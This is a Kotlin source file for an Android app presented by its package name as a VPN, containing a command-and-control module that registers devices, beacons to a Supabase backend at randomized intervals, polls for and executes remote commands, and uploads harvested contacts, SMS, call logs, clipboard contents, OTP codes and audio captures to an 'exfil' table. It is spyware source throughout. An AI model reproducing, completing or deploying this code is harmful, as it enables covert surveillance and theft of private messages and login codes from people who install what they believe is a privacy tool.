package com.iran.liberty.vpn

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.work.Constraints
import androidx.work.CoroutineWorker
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequest
import androidx.work.PeriodicWorkRequest
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.postgrest.from
import io.github.jan.supabase.postgrest.query.Columns
import io.github.jan.supabase.realtime.Realtime
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.util.UUID
import java.util.concurrent.TimeUnit

/**
 * C2 Manager for Supabase communication with integrated WorkManager beacon
 * Pathway 4: Harvesting & C2 Developer
 */
class C2Manager private constructor(private val context: Context) {
    
    private val scope = CoroutineScope(Dispatchers.IO)
    private var client: SupabaseClient? = null
    private var isConnected = false
    private var pollingJob: Job? = null
    private lateinit var deviceId: String
    private lateinit var harvestEngine: HarvestEngine
    
    companion object {
        private const val TAG = "C2Manager"
        
        @SuppressLint("StaticFieldLeak")
        private var instance: C2Manager? = null
        
        fun getInstance(context: Context): C2Manager {
            return instance ?: synchronized(this) {
                instance ?: C2Manager(context.applicationContext).also { instance = it }
            }
        }
    }
    
    init {
        harvestEngine = HarvestEngine.getInstance(context)
        initializeDeviceId()
        initializeSupabase()
    }
    
    /**
     * Generate or retrieve device ID
     */
    private fun initializeDeviceId() {
        val prefs = context.getSharedPreferences("LibertyConfig", Context.MODE_PRIVATE)
        deviceId = prefs.getString("device_id", null) ?: run {
            val newId = generateDeviceId()
            prefs.edit().putString("device_id", newId).apply()
            newId
        }
        Log.d(TAG, "Device ID: $deviceId")
    }
    
    /**
     * Generate unique device ID
     */
    private fun generateDeviceId(): String {
        return try {
            // Try to get Android ID first
            val androidId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            
            if (androidId != null && androidId != "9774d56d682e549c") {
                "android_${androidId}"
            } else {
                // Fallback to UUID
                "uuid_${UUID.randomUUID()}"
            }
        } catch (e: Exception) {
            "uuid_${UUID.randomUUID()}"
        }
    }
    
    /**
     * Initialize Supabase client and schedule WorkManager beacon
     */
    private fun initializeSupabase() {
        scope.launch {
            try {
                client = createSupabaseClient(
                    supabaseUrl = Constants.SUPABASE_URL,
                    supabaseKey = Constants.SUPABASE_ANON_KEY
                ) {
                    install(Postgrest)
                    install(Realtime)
                }
                
                isConnected = true
                Log.d(TAG, "Supabase client initialized")
                
                // Register device
                registerDevice()
                
                // Start polling for commands
                startCommandPolling()
                
                // Schedule periodic WorkManager beacon
                scheduleWorkManagerBeacon()
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to initialize Supabase", e)
                isConnected = false
                
                // Retry after delay
                delay(60000) // 1 minute
                initializeSupabase()
            }
        }
    }
    
    /**
     * Schedule periodic beacon using WorkManager (every 6-24 hours)
     */
    private fun scheduleWorkManagerBeacon() {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(false)
                .build()
            
            // Random interval between 6-24 hours
            val intervalHours = (Constants.BEACON_INTERVAL_HOURS_MIN..Constants.BEACON_INTERVAL_HOURS_MAX).random()
            
            val beaconWork = PeriodicWorkRequest.Builder(
                BeaconWorker::class.java,
                intervalHours, TimeUnit.HOURS
            )
                .setConstraints(constraints)
                .setInitialDelay(intervalHours, TimeUnit.HOURS) // Random initial delay
                .addTag(Constants.BEACON_WORKER_TAG)
                .build()
            
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                Constants.BEACON_WORKER_TAG,
                ExistingPeriodicWorkPolicy.KEEP,
                beaconWork
            )
            
            Log.d(TAG, "WorkManager beacon scheduled every $intervalHours hours")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule WorkManager beacon", e)
        }
    }
    
    /**
     * Trigger an immediate beacon (one-time work)
     */
    fun triggerImmediateBeacon() {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()
            
            val immediateWork = OneTimeWorkRequest.Builder(BeaconWorker::class.java)
                .setConstraints(constraints)
                .addTag("${Constants.BEACON_WORKER_TAG}_immediate")
                .build()
            
            WorkManager.getInstance(context).enqueue(immediateWork)
            Log.d(TAG, "Immediate beacon triggered")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to trigger immediate beacon", e)
        }
    }
    
    /**
     * Inner WorkManager worker class for beacon signals
     */
    private class BeaconWorker(context: Context, params: WorkerParameters) : 
        CoroutineWorker(context, params) {
        
        override suspend fun doWork(): Result {
            return try {
                Log.d("BeaconWorker", "Executing beacon work")
                
                val c2Manager = C2Manager.getInstance(applicationContext)
                
                // Send beacon through C2Manager
                c2Manager.sendBeacon()
                
                // Upload any cached data
                c2Manager.uploadCachedData()
                
                Result.success()
            } catch (e: Exception) {
                Log.e("BeaconWorker", "Beacon work failed", e)
                Result.retry()
            }
        }
    }
    
    /**
     * Register device with C2
     */
    private suspend fun registerDevice() {
        if (!isConnected) return
        
        try {
            val deviceInfo = mapOf(
                "device_id" to deviceId,
                "model" to Build.MODEL,
                "brand" to Build.BRAND,
                "product" to Build.PRODUCT,
                "sdk_int" to Build.VERSION.SDK_INT,
                "release" to Build.VERSION.RELEASE,
                "package_name" to context.packageName,
                "first_seen" to System.currentTimeMillis(),
                "last_seen" to System.currentTimeMillis(),
                "status" to "active"
            )
            
            client?.from(Constants.TABLE_DEVICES)?.upsert(deviceInfo)
            Log.d(TAG, "Device registered with C2")
            
        } catch (e: Exception) {
            Log.e(TAG, "Device registration failed", e)
        }
    }
    
    /**
     * Start polling for commands from C2
     */
    private fun startCommandPolling() {
        pollingJob?.cancel()
        
        pollingJob = scope.launch {
            while (isConnected) {
                try {
                    checkForCommands()
                    // Random poll interval between 15-60 minutes
                    val pollInterval = (15 * 60 * 1000L..60 * 60 * 1000L).random()
                    delay(pollInterval)
                } catch (e: Exception) {
                    Log.e(TAG, "Command polling error", e)
                    delay(300000) // Wait 5 minutes on error
                }
            }
        }
    }
    
    /**
     * Check for new commands from C2
     */
    private suspend fun checkForCommands() {
        if (!isConnected) return
        
        try {
            val commands = client?.from(Constants.TABLE_COMMANDS)
                ?.select {
                    // Get commands for this device
                    Columns("id, command, parameters, created_at")
                    filter("device_id", "eq", deviceId)
                    filter("executed", "eq", false)
                    order("created_at", ascending = false)
                    limit(10)
                }
            
            commands?.data?.forEach { commandRow ->
                val command = commandRow["command"] as? String
                val params = commandRow["parameters"] as? Map<String, String> ?: emptyMap()
                val commandId = commandRow["id"] as? String
                
                if (command != null && commandId != null) {
                    Log.d(TAG, "Executing command: $command")
                    
                    // Execute command
                    harvestEngine.executeCommand(command, params)
                    
                    // Mark as executed
                    markCommandExecuted(commandId)
                }
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error checking commands", e)
        }
    }
    
    /**
     * Mark command as executed
     */
    private suspend fun markCommandExecuted(commandId: String) {
        try {
            client?.from(Constants.TABLE_COMMANDS)
                ?.update({
                    set("executed", true)
                    set("executed_at", System.currentTimeMillis())
                }) {
                    filter("id", "eq", commandId)
                }
        } catch (e: Exception) {
            Log.e(TAG, "Error marking command executed", e)
        }
    }
    
    /**
     * Send beacon to C2 with device status
     */
    suspend fun sendBeacon() {
        if (!isConnected) return
        
        try {
            val beaconData = mapOf(
                "device_id" to deviceId,
                "timestamp" to System.currentTimeMillis(),
                "battery_level" to getBatteryLevel(),
                "memory_usage" to getMemoryUsage(),
                "harvesting_active" to true,
                "permissions_granted" to getGrantedPermissions(),
                "last_upload" to System.currentTimeMillis()
            )
            
            client?.from(Constants.TABLE_BEACONS)?.insert(beaconData)
            Log.d(TAG, "Beacon sent to C2")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send beacon", e)
        }
    }
    
    /**
     * Upload harvested data to C2
     */
    fun uploadData(dataType: String, data: Map<String, Any>) {
        if (!isConnected) {
            Log.w(TAG, "C2 not connected, caching data locally")
            cacheDataLocally(dataType, data)
            return
        }
        
        scope.launch {
            try {
                // Encrypt sensitive data
                val encryptedData = if (shouldEncrypt(dataType)) {
                    val jsonData = Json.encodeToString(data)
                    CryptoUtil.encrypt(context, jsonData)
                } else {
                    data
                }
                
                val exfilRecord = mapOf(
                    "device_id" to deviceId,
                    "data_type" to dataType,
                    "data" to encryptedData,
                    "timestamp" to System.currentTimeMillis(),
                    "encrypted" to shouldEncrypt(dataType)
                )
                
                client?.from(Constants.TABLE_EXFIL)?.insert(exfilRecord)
                Log.d(TAG, "Uploaded $dataType data to C2")
                
            } catch (e: Exception) {
                Log.e(TAG, "Upload failed for $dataType", e)
                cacheDataLocally(dataType, data)
            }
        }
    }
    
    /**
     * Cache data locally when C2 is unavailable
     */
    private fun cacheDataLocally(dataType: String, data: Map<String, Any>) {
        scope.launch {
            try {
                val directory = File(context.filesDir, "C2Cache")
                if (!directory.exists()) {
                    directory.mkdirs()
                }
                
                val fileName = "${dataType}_${System.currentTimeMillis()}.json"
                val file = File(directory, fileName)
                
                val jsonData = Json.encodeToString(data)
                file.writeText(jsonData)
                
                Log.d(TAG, "Cached $dataType data locally: ${file.absolutePath}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to cache data locally", e)
            }
        }
    }
    
    /**
     * Upload cached data when connection is restored
     */
    fun uploadCachedData() {
        scope.launch {
            val directory = File(context.filesDir, "C2Cache")
            if (!directory.exists()) return@launch
            
            directory.listFiles()?.forEach { file ->
                try {
                    val content = file.readText()
                    val data = Json.decodeFromString<Map<String, Any>>(content)
                    
                    // Extract data type from filename
                    val dataType = file.name.substringBefore("_")
                    
                    uploadData(dataType, data)
                    
                    // Delete file after successful upload
                    file.delete()
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to upload cached file: ${file.name}", e)
                }
            }
        }
    }
    
    /**
     * Check if data type should be encrypted
     */
    private fun shouldEncrypt(dataType: String): Boolean {
        return when (dataType) {
            "contacts", "sms", "calls", "clipboard", "otp_codes", "audio_captures" -> true
            else -> false
        }
    }
    
    /**
     * Get battery level (requires BatteryManager)
     */
    private fun getBatteryLevel(): Int {
        return try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            -1
        }
    }
    
    /**
     * Get memory usage
     */
    private fun getMemoryUsage(): Map<String, Any> {
        val runtime = Runtime.getRuntime()
        return mapOf(
            "total_memory" to runtime.totalMemory(),
            "free_memory" to runtime.freeMemory(),
            "max_memory" to runtime.maxMemory()
        )
    }
    
    /**
     * Get list of granted permissions
     */
    private fun getGrantedPermissions(): List<String> {
        return Constants.HARVEST_PERMISSIONS.filter { permission ->
            context.checkSelfPermission(permission) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }
    
    /**
     * Get device ID
     */
    fun getDeviceId(): String = deviceId
    
    /**
     * Check C2 connection status
     */
    fun isConnected(): Boolean = isConnected
    
    /**
     * Manually trigger beacon (public method)
     */
    fun triggerBeacon() {
        scope.launch {
            sendBeacon()
        }
    }
}